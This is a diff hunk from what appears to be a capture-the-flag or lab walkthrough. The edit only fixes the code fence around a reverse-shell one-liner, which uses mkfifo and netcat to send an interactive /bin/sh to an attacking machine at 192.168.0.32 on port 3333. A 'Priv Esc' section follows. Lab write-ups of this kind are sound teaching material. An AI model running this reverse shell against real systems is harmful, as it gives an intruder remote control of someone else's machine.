@@ -149,7 +149,8 @@ uid=1000(leopold) gid=1000(leopold) groups=1000(leopold),4(adm),24(cdrom),27(sud
 The shell is not stable and dies after some mintues. To fix this, we can create a new shell. Open a new netcat listener on port 3333 on the attacking machine and write the code below in the current shell. Remember to change the attacking IP address.
 
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.32 3333 >/tmp/f```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.32 3333 >/tmp/f
+```
 
 
 ## Priv Esc
